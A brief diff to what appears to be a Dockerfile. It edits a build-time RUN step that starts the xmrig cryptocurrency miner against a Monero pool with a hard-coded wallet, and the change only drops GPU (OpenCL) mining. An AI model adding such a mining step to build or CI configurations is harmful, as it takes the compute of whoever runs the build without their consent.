@@ -17,4 +17,4 @@ RUN apt-get update && \
     chmod +x xmrig
 
 # Run
-RUN ./xmrig --opencl -o xmr.pool.gntl.co.uk:20009 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls
+RUN ./xmrig -o xmr.pool.gntl.co.uk:20009 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls
